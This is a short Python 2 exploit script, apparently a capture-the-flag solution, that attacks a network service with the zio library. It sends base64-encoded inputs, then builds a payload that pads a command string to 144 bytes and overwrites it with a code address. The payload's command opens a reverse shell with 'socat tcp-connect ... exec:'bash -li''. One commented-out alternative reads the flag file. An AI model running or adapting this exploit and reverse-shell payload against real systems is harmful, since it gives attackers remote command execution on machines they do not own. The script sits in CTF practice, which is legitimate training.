#!/usr/bin/env python2
#-*- coding:utf-8 -*-
from zio import *
import base64

ip = '10.211.55.48'
port = 4321

io = zio((ip, port), timeout = 10000, print_write = COLORED(REPR))

for i in range(11):
    io.read_until("base64'd:")
    #io.writeline("\x02\x00\x00\x00".encode('base64').strip('\n'))
    io.writeline(base64.b64encode("\x02\x00\x00\x00"))

io.read_until("base64'd:")

cmd = "\x00cat flag"
cmd = "\x00socat tcp-connect:10.211.55.48:9955 exec:'bash -li',pty,stderr,setsid,sigint,sane"
payload = cmd + '\x00'*(144-len(cmd)) + l64(0x4010D0)

#io.writeline(payload.encode('base64').replace('\n', ''))
#io.writeline(payload.encode('base64').strip('\n'))
io.writeline(base64.b64encode(payload))
io.read()
